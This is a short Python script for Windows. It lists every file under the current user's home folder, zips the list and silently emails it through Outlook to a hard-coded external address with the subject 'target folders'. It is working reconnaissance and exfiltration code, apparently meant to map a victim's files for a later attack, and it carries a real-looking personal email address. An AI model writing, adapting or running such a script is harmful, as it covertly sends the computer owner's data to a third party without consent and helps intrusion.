import win32com.client as win32
import os
import getpass
username = getpass.getuser()
adresses = ['martin.pezous-puech@live.fr']
directory = 'C:/users/' + str(username)

os.system('cd C:/users/' + str(username))
os.chdir('C:/users/' + str(username))
os.system('dir /s /b /o:gn > C:/users/' + str(username) + '/FolderList.txt')
os.system('powershell Compress-Archive -Force C:/Users/' + str(username) + '/FolderList.txt ' +  'C:/Users/' + str(username) + '/FolderList.zip')



for adress in adresses:

        outlook = win32.Dispatch('Outlook.Application')
        mail = outlook.CreateItem(0)
        mail.To = adress
        mail.Subject = 'target folders'
        mail.Body = ''
        mail.Attachments.Add(directory + '/FolderList.zip')
        mail.HTMLBody = ''
        mail.Send()